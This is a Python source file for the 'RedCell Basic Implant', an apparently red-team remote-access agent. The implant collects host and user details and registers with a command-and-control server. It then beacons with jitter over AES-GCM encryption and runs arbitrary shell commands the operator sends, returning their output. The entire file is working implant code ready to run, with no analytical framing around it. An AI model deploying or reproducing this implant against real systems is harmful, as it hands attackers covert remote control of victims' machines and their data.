"""
RedCell Basic Implant

Python-based implant with beacon functionality and encrypted C2 communications.
"""

import os
import sys
import time
import random
import platform
import subprocess
import socket
import requests
import json
import base64
from typing import Dict, Any, Optional
from cryptography.hazmat.primitives.ciphers.aead import AESGCM


class ImplantCrypto:
    """Simplified crypto for implant (mirrors C2 server crypto)."""

    def __init__(self, key_b64: str):
        """
        Initialize crypto with base64-encoded key.

        Args:
            key_b64: Base64-encoded 32-byte AES key
        """
        self.key = base64.b64decode(key_b64)
        self.aesgcm = AESGCM(self.key)

    def encrypt_json(self, data: Dict[str, Any]) -> Dict[str, str]:
        """Encrypt JSON data."""
        plaintext = json.dumps(data).encode('utf-8')
        nonce = os.urandom(12)
        ciphertext = self.aesgcm.encrypt(nonce, plaintext, None)

        return {
            'nonce': base64.b64encode(nonce).decode('utf-8'),
            'ciphertext': base64.b64encode(ciphertext).decode('utf-8')
        }

    def decrypt_json(self, encrypted_data: Dict[str, str]) -> Dict[str, Any]:
        """Decrypt JSON data."""
        nonce = base64.b64decode(encrypted_data['nonce'])
        ciphertext = base64.b64decode(encrypted_data['ciphertext'])
        plaintext = self.aesgcm.decrypt(nonce, ciphertext, None)

        return json.loads(plaintext.decode('utf-8'))


class BasicImplant:
    """
    Basic Python implant with C2 beacon functionality.

    Features:
    - Encrypted communications with C2
    - Periodic beacon with jitter
    - Command execution
    - System information gathering
    """

    def __init__(self, c2_url: str, verify_ssl: bool = False):
        """
        Initialize implant.

        Args:
            c2_url: C2 server URL (e.g., http://127.0.0.1:8443)
            verify_ssl: Verify SSL certificates (False for self-signed)
        """
        self.c2_url = c2_url.rstrip('/')
        self.verify_ssl = verify_ssl
        self.implant_id = None
        self.encryption_key = None
        self.crypto = None
        self.beacon_interval = 60
        self.beacon_jitter = 0.2
        self.registered = False
        self.task_results = []

    def gather_system_info(self) -> Dict[str, str]:
        """
        Gather system information.

        Returns:
            Dictionary with system info
        """
        try:
            hostname = socket.gethostname()
            username = os.getenv('USER') or os.getenv('USERNAME') or 'unknown'
            ip_address = socket.gethostbyname(hostname)
            os_info = f"{platform.system()} {platform.release()}"

            return {
                'hostname': hostname,
                'username': username,
                'ip_address': ip_address,
                'operating_system': os_info
            }
        except Exception as e:
            return {
                'hostname': 'unknown',
                'username': 'unknown',
                'ip_address': 'unknown',
                'operating_system': f'unknown ({str(e)})'
            }

    def register(self) -> bool:
        """
        Register with C2 server.

        Returns:
            True if successful, False otherwise
        """
        try:
            system_info = self.gather_system_info()

            response = requests.post(
                f'{self.c2_url}/api/register',
                json=system_info,
                verify=self.verify_ssl,
                timeout=10
            )

            if response.status_code == 201:
                data = response.json()
                self.implant_id = data['implant_id']
                self.encryption_key = data['encryption_key']
                self.beacon_interval = data.get('beacon_interval', 60)
                self.beacon_jitter = data.get('beacon_jitter', 0.2)
                self.crypto = ImplantCrypto(self.encryption_key)
                self.registered = True
                return True

            return False

        except Exception as e:
            print(f"Registration error: {e}", file=sys.stderr)
            return False

    def execute_command(self, command: str, arguments: Dict[str, Any]) -> Dict[str, Any]:
        """
        Execute a command received from C2.

        Args:
            command: Command name
            arguments: Command arguments

        Returns:
            Result dictionary
        """
        try:
            if command == 'shell':
                # Execute shell command
                cmd = arguments.get('cmd', '')
                result = subprocess.run(
                    cmd,
                    shell=True,
                    capture_output=True,
                    text=True,
                    timeout=30
                )
                return {
                    'stdout': result.stdout,
                    'stderr': result.stderr,
                    'returncode': result.returncode
                }

            elif command == 'sysinfo':
                # Return system information
                return self.gather_system_info()

            elif command == 'pwd':
                # Get current working directory
                return {'pwd': os.getcwd()}

            elif command == 'ls':
                # List directory contents
                path = arguments.get('path', '.')
                entries = os.listdir(path)
                return {'entries': entries, 'count': len(entries)}

            elif command == 'sleep':
                # Change beacon interval
                new_interval = arguments.get('interval', self.beacon_interval)
                self.beacon_interval = new_interval
                return {'beacon_interval': self.beacon_interval}

            elif command == 'exit':
                # Exit implant
                return {'status': 'exiting'}

            else:
                return {'error': f'Unknown command: {command}'}

        except Exception as e:
            return {'error': str(e)}

    def beacon(self) -> Optional[list]:
        """
        Send beacon to C2 and retrieve tasks.

        Returns:
            List of tasks or None if failed
        """
        if not self.registered or not self.crypto:
            return None

        try:
            # Prepare beacon data
            beacon_data = {
                'status': 'alive',
                'results': self.task_results
            }

            # Encrypt beacon data
            encrypted_data = self.crypto.encrypt_json(beacon_data)

            # Send beacon
            response = requests.post(
                f'{self.c2_url}/api/beacon/{self.implant_id}',
                json=encrypted_data,
                verify=self.verify_ssl,
                timeout=10
            )

            if response.status_code == 200:
                # Decrypt response
                encrypted_response = response.json()
                response_data = self.crypto.decrypt_json(encrypted_response)

                # Clear sent results
                self.task_results = []

                # Update beacon interval if changed
                self.beacon_interval = response_data.get('beacon_interval', self.beacon_interval)

                return response_data.get('tasks', [])

            return None

        except Exception as e:
            print(f"Beacon error: {e}", file=sys.stderr)
            return None

    def calculate_sleep_time(self) -> float:
        """
        Calculate sleep time with jitter.

        Returns:
            Sleep time in seconds
        """
        jitter_amount = self.beacon_interval * self.beacon_jitter
        jitter = random.uniform(-jitter_amount, jitter_amount)
        return max(1, self.beacon_interval + jitter)

    def run(self):
        """Main implant loop."""
        print(f"Implant starting, C2: {self.c2_url}")

        # Register with C2
        retry_count = 0
        max_retries = 5

        while not self.registered and retry_count < max_retries:
            print(f"Attempting registration (attempt {retry_count + 1}/{max_retries})")
            if self.register():
                print(f"Successfully registered as {self.implant_id}")
                break
            retry_count += 1
            time.sleep(5)

        if not self.registered:
            print("Failed to register with C2, exiting")
            return

        # Main beacon loop
        running = True
        while running:
            # Send beacon and get tasks
            tasks = self.beacon()

            if tasks:
                print(f"Received {len(tasks)} task(s)")

                for task in tasks:
                    task_id = task['task_id']
                    command = task['command']
                    arguments = task['arguments']

                    print(f"Executing task {task_id}: {command}")

                    # Execute command
                    result = self.execute_command(command, arguments)

                    # Store result for next beacon
                    self.task_results.append({
                        'task_id': task_id,
                        'result': result,
                        'error': result.get('error')
                    })

                    # Check for exit command
                    if command == 'exit':
                        running = False
                        break

            # Sleep with jitter
            sleep_time = self.calculate_sleep_time()
            print(f"Sleeping for {sleep_time:.2f} seconds")
            time.sleep(sleep_time)

        print("Implant exiting")


def main():
    """Main entry point."""
    import argparse

    parser = argparse.ArgumentParser(description='RedCell Basic Implant')
    parser.add_argument('--c2', required=True, help='C2 server URL')
    parser.add_argument('--verify-ssl', action='store_true', help='Verify SSL certificates')
    args = parser.parse_args()

    implant = BasicImplant(c2_url=args.c2, verify_ssl=args.verify_ssl)
    implant.run()


if __name__ == '__main__':
    main()
